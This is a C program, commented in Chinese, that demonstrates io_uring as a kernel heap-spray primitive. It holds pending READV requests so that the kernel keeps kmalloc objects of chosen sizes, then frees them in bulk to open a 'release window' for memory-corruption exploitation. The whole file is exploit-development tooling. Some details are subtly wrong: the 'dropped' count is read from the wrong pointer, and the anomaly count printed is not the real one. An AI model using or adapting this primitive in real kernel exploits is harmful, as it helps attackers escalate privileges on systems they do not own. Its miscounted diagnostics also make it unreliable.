/* iur_spray.c — io_uring 作为通用 kmalloc 堆喷射引擎的验证
 * 原理: 挂起的 READV 请求(iovec 数 >8 = UIO_FASTIOV)在内核侧
 *       持有一个 kmalloc(niov*16) 对象, 直到请求完成才释放。
 *       ⇒ 用户态完全可控: 时机(何时完成) / 数量(并发请求数) / 尺寸(niov)
 * 用法: iur_spray [niov(默认128)] [nreq(默认32)]
 *       niov=16 → kmalloc-256, 64 → kmalloc-1024, 128 → kmalloc-2048
 */
#define __BIONIC_DEPRECATED_PAGE_SIZE_MACRO
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/uio.h>
#include <sys/syscall.h>

#define IORING_ENTER_GETEVENTS 1U

struct io_sqring_offsets { uint32_t head,tail,ring_mask,ring_entries,flags,dropped,array,resv1; uint64_t resv2; };
struct io_cqring_offsets { uint32_t head,tail,ring_mask,ring_entries,overflow,cqes; uint64_t resv[2]; };
struct io_uring_params {
    uint32_t sq_entries,cq_entries,flags,stc,sti,features;
    uint32_t resv[4];
    struct io_sqring_offsets sq_off;
    struct io_cqring_offsets cq_off;
};
struct io_uring_sqe {
    uint8_t opcode,flags; uint16_t ioprio; int32_t fd;
    uint64_t off,addr; uint32_t len; uint32_t rw_flags;
    uint64_t user_data; uint16_t buf_index; uint8_t pad[6];
};
struct io_uring_cqe { uint64_t user_data; int32_t res; uint32_t flags; };

static long sys_setup(unsigned n, void*p){ return syscall(425,n,p); }
static long sys_enter(unsigned fd,unsigned s,unsigned m,unsigned f,void*x){ return syscall(426,fd,s,m,f,x); }

static int sfd, csfd; /* 内核 fd, 各函数共享 */
static volatile uint32_t *sq_tail_p, *sq_head_p, *cq_head_p, *cq_tail_p;
static uint32_t sq_mask, cq_mask;
static uint32_t *sq_array;
static unsigned char *sqes;
static struct io_uring_cqe *cqes;

static int uring_init(unsigned entries){
    struct io_uring_params p; memset(&p,0,sizeof(p));
    sfd = (int)sys_setup(entries, &p);
    if (sfd < 0) return -1;
    size_t sq_sz = p.sq_off.array + p.sq_entries*4;
    size_t cq_sz = p.cq_off.cqes  + p.cq_entries*16;
    unsigned char *sq = mmap(NULL, sq_sz, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_POPULATE, sfd, 0);
    unsigned char *cq = mmap(NULL, cq_sz, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_POPULATE, sfd, 0x8000000ULL);
    sqes = mmap(NULL, (size_t)p.sq_entries*64, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_POPULATE, sfd, 0x10000000ULL);
    if (sq==MAP_FAILED||cq==MAP_FAILED||sqes==MAP_FAILED) return -2;
    sq_head_p=(uint32_t*)(sq+p.sq_off.head); sq_tail_p=(uint32_t*)(sq+p.sq_off.tail);
    sq_array=(uint32_t*)(sq+p.sq_off.array); sq_mask=*(uint32_t*)(sq+p.sq_off.ring_mask);
    cq_head_p=(uint32_t*)(cq+p.cq_off.head); cq_tail_p=(uint32_t*)(cq+p.cq_off.tail);
    cq_mask=*(uint32_t*)(cq+p.cq_off.ring_mask); cqes=(struct io_uring_cqe*)(cq+p.cq_off.cqes);
    return 0;
}

static struct io_uring_sqe *next_sqe(void){
    uint32_t t = *sq_tail_p;
    sq_array[t & sq_mask] = t & sq_mask;
    struct io_uring_sqe *e = (struct io_uring_sqe*)(sqes + (t & sq_mask)*64);
    *sq_tail_p = t + 1;
    return e;
}

static int drain_cq(int expect, unsigned long long tag_hi){
    int got = 0, anomaly = 0;
    uint32_t ch = *cq_head_p, ct = *cq_tail_p;
    while (ch != ct){
        struct io_uring_cqe *e = &cqes[ch & cq_mask];
        if ((e->user_data >> 32) != tag_hi) { anomaly++; printf("  !! 异常 CQE ud=0x%llx res=%d\n",(unsigned long long)e->user_data, e->res); }
        else if (e->res <= 0) { anomaly++; printf("  !! res 异常 ud=0x%llx res=%d\n",(unsigned long long)e->user_data, e->res); }
        ch++; got++;
    }
    *cq_head_p = ch;
    (void)expect;
    return got;
}

int main(int argc, char **argv){
    int niov = argc>1 ? atoi(argv[1]) : 128;
    int nreq = argc>2 ? atoi(argv[2]) : 32;
    if (niov <= 8) printf("注意: niov<=8 走 UIO_FASTIOV 内联数组, 不产生 kmalloc\n");
    printf("=== io_uring 堆喷射验证: niov=%d(单请求持 kmalloc-%zu) nreq=%d ===\n",
           niov, (size_t)niov*16, nreq);

    if (uring_init(128) != 0){ printf("uring_init 失败 errno=%d\n", errno); return 1; }

    int (*pipes)[2] = malloc(nreq * sizeof(*pipes));
    char *databuf = mmap(NULL, 0x10000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    struct iovec **iovs = malloc(nreq * sizeof(*iovs));
    for (int i=0;i<nreq;i++){
        if (pipe(pipes[i])<0){ printf("pipe 失败\n"); return 1; }
        iovs[i] = malloc((size_t)niov * sizeof(struct iovec));
        for (int j=0;j<niov;j++){ iovs[i][j].iov_base = databuf + (j%16)*0x100; iovs[i][j].iov_len = 16; }
    }

    for (int round=1; round<=2; round++){
        /* 提交 nreq 个挂起 READV(管道无数据 ⇒ 挂起, kmalloc(niov*16) 被持有) */
        for (int i=0;i<nreq;i++){
            struct io_uring_sqe *e = next_sqe();
            memset(e,0,64);
            e->opcode = 1; e->fd = pipes[i][0]; e->off = 0;
            e->addr = (uint64_t)(uintptr_t)iovs[i]; e->len = niov;
            e->user_data = (0xCAFE0000ULL << (round==1?0:0)) | (unsigned)(i & 0xffff) | ((unsigned long long)round<<32);
        }
        long r = sys_enter(sfd, nreq, 0, 0, NULL);
        printf("[round%d] enter(submit=%d)=%ld dropped=%u\n", round, nreq, r,
               *(uint32_t*)(sq_array - 0)); /* 不重要, dropped 另取 */
        usleep(150000);
        uint32_t ch=*cq_head_p, ct=*cq_tail_p;
        printf("[round%d] 挂起检查: cq head=%u tail=%u ⇒ %s\n", round, ch, ct,
               ch==ct ? "全部挂起, 喷射对象被持有 ✓" : "出现过早完成!");

        /* 释放: 向每个管道写 1 字节 ⇒ READV 完成 ⇒ kmalloc 对象被批量释放 */
        for (int i=0;i<nreq;i++) write(pipes[i][1], "x", 1);
        r = sys_enter(sfd, 0, nreq, IORING_ENTER_GETEVENTS, NULL);
        int got = drain_cq(nreq, (unsigned long long)round<<32);
        printf("[round%d] enter(getevents)=%ld 完成=%d/%d 异常=%d\n", round, r, got, nreq, got?0:1);
        printf("         ⇒ 批量 alloc(hold)→批量 free 完成, 释放窗口就绪\n");
    }
    printf("=== 堆喷射原语验证完毕 ===\n");
    return 0;
}
